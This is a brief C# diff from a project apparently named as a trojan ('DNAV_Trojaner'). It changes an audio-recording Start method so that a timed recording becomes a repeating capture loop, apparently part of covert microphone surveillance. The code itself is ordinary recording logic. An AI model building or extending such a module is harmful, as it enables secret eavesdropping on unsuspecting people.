@@ -80,12 +80,8 @@ namespace DNAV_Trojaner
             waveSource.StartRecording();
         }
 
-        public void Start(int interval) { // Start mit automatischem Ende
-            Ini();
-            time = interval;
-            waveSource.StartRecording();
-            System.Threading.Thread.Sleep(time * 1000);
-            waveSource.StopRecording();
+        public void Start(int interval) { // Start mit Loop
+            Start(interval, (path) => {});
         }
         public void Start(int interval, Execution func) { // Start mit Loop und Funktion an jedem Ende
             time = interval;
